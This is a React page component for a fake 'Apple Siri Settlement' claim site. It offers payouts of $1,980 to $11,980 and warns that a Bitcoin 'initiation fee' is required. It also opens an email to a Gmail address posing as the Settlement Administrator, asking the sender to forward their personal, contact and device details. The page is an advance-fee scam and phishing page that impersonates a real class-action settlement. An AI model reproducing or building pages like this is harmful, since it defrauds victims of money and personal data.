import { createFileRoute, Link } from "@tanstack/react-router";
import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Apple, Check, ChevronLeft, Mail, ShieldCheck, Bitcoin, AlertTriangle } from "lucide-react";

export const Route = createFileRoute("/claim/settlement")({
  head: () => ({
    meta: [
      { title: "Select Settlement Amount — Apple Siri Settlement" },
      { name: "description", content: "Select your preferred settlement amount for the Apple Siri Settlement claim." },
      { property: "og:title", content: "Select Settlement Amount — Apple Siri Settlement" },
      { property: "og:description", content: "Choose your settlement payout amount from the available options." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: SettlementPage,
});

const AMOUNTS = [
  "$1,980.00",
  "$2,980.00",
  "$4,980.00",
  "$5,980.00",
  "$6,980.00",
  "$7,980.00",
  "$8,980.00",
  "$9,980.00",
  "$11,980.00",
];

function SettlementPage() {
  const [selectedAmount, setSelectedAmount] = useState<string>("");
  const [confirmed, setConfirmed] = useState(false);
  const [error, setError] = useState<string>("");

  const handleConfirm = () => {
    if (!selectedAmount) {
      setError("Please select a settlement amount to proceed.");
      return;
    }
    setError("");
    setConfirmed(true);
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleMailClaim = () => {
    const to = "applesettlement0@gmail.com";
    const subject = `Apple Siri Settlement Claim — ${selectedAmount}`;
    const body =
      `Apple Siri Settlement Claim Submission\n\n` +
      `Selected Settlement Amount: ${selectedAmount}\n` +
      `Settlement Allocation: $12,000.00 (Apple Gem Wallet)\n` +
      `Case: Lopez v. Apple Inc. — $250 Million Siri Settlement\n\n` +
      `Please process my settlement claim using all of the personal, contact, ` +
      `and eligible device information registered on file with my claim submission.\n\n` +
      `I acknowledge the Bitcoin initiation fee required to fast-process this ` +
      `settlement claim for quick withdrawal of my selected amount.\n\n` +
      `Thank you,\n[Claimant]`;
    window.location.href = `mailto:${to}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b bg-card">
        <div className="mx-auto max-w-3xl px-6 py-5 flex items-center justify-between">
          <Link to="/claim" className="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
            <ChevronLeft className="h-4 w-4" />
            Back
          </Link>
          <div className="inline-flex items-center gap-2">
            <Apple className="h-5 w-5 text-primary" />
            <span className="text-sm font-medium">Siri Settlement</span>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-3xl px-6 py-10 md:py-14">
        {confirmed ? (
          <Card>
            <CardHeader>
              <div className="mb-3 inline-flex h-12 w-12 items-center justify-center rounded-2xl bg-primary/10">
                <Mail className="h-6 w-6 text-primary" />
              </div>
              <CardTitle>Mail Your Settlement Claim</CardTitle>
              <CardDescription>
                To finalize your claim for <strong className="text-foreground">{selectedAmount}</strong>, tap the button below.
                Your device's mail app will open with all of the information registered to your claim, pre-addressed to the
                Settlement Administrator at <strong className="text-foreground">applesettlement0@gmail.com</strong>.
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <Button size="lg" className="w-full sm:w-auto" onClick={handleMailClaim}>
                <Mail className="mr-2 h-4 w-4" />
                Mail Settlement Claim
              </Button>
              <div>
                <Link to="/"><Button variant="outline">Return Home</Button></Link>
              </div>
            </CardContent>
          </Card>
        ) : (
          <>
            <div className="mb-8">
              <h1 className="text-2xl md:text-3xl font-semibold tracking-tight text-foreground">
                Select Settlement Amount
              </h1>
              <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
                Choose your preferred settlement payout amount from the available options below.
                The amount you select will be processed according to the withdrawal option you previously chose.
              </p>
            </div>

            <Card>
              <CardHeader>
                <CardTitle className="text-lg">Available Settlement Amounts</CardTitle>
                <CardDescription>
                  Select one amount. This will determine your final claim tier and payout.
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
              <RadioGroup
                  value={selectedAmount}
                  onValueChange={(v) => { setSelectedAmount(v); setError(""); }}
                  className="grid grid-cols-1 gap-3 sm:grid-cols-2"
                >
                  {AMOUNTS.map((amount) => {
                    const isSelected = selectedAmount === amount;
                    return (
                      <div
                        key={amount}
                        className={[
                          "relative flex items-center gap-3 rounded-xl border-2 p-4 transition-all cursor-pointer",
                          isSelected
                            ? "border-primary bg-primary/[0.06] shadow-sm"
                            : "border-border hover:border-muted-foreground/40 hover:bg-accent/40",
                        ].join(" ")}
                        onClick={() => { setSelectedAmount(amount); setError(""); }}
                      >
                        <RadioGroupItem value={amount} id={amount} className="shrink-0" />
                        <Label htmlFor={amount} className="flex-1 cursor-pointer text-base font-semibold text-foreground">
                          {amount}
                        </Label>
                        {isSelected && (
                          <span className="absolute top-2 right-2 inline-flex h-5 w-5 items-center justify-center rounded-full bg-primary text-primary-foreground">
                            <Check className="h-3 w-3" />
                          </span>
                        )}
                      </div>
                    );
                  })}
                </RadioGroup>

                {selectedAmount && (
                  <div className="rounded-xl border border-primary/20 bg-primary/[0.05] p-4">
                    <p className="text-sm text-muted-foreground">You have selected</p>
                    <p className="text-xl font-semibold text-foreground mt-1">{selectedAmount}</p>
                  </div>
                )}

                {error && (
                  <p className="text-sm text-destructive">{error}</p>
                )}

                {/* Bitcoin initiation fee note */}
                <div className="rounded-xl border border-amber-500/30 bg-amber-500/[0.06] p-4">
                  <div className="flex items-start gap-3">
                    <div className="mt-0.5 inline-flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-amber-500/15">
                      <Bitcoin className="h-4 w-4 text-amber-600" />
                    </div>
                    <div className="space-y-1">
                      <p className="text-sm font-semibold text-foreground inline-flex items-center gap-1.5">
                        <AlertTriangle className="h-3.5 w-3.5 text-amber-600" />
                        Note
                      </p>
                      <p className="text-sm leading-relaxed text-muted-foreground">
                        There is an <strong className="text-foreground">initiation fee in Bitcoin</strong> required to process
                        this settlement claim. This fee is used to fast-process your settlement claim for quick and fast
                        withdrawal of your selected amount. If you agree to this fee, please continue and tap
                        <strong className="text-foreground"> Confirm Selection</strong> to proceed.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="flex flex-col-reverse sm:flex-row sm:justify-end gap-3 pt-2">
                  <Link to="/claim" className="w-full sm:w-auto">
                    <Button type="button" variant="outline" className="w-full sm:w-auto">
                      Back
                    </Button>
                  </Link>
                  <Button
                    type="button"
                    size="lg"
                    className="w-full sm:w-auto"
                    onClick={handleConfirm}
                  >
                    Confirm Selection
                  </Button>
                </div>
              </CardContent>
            </Card>
          </>
        )}
      </main>
    </div>
  );
}
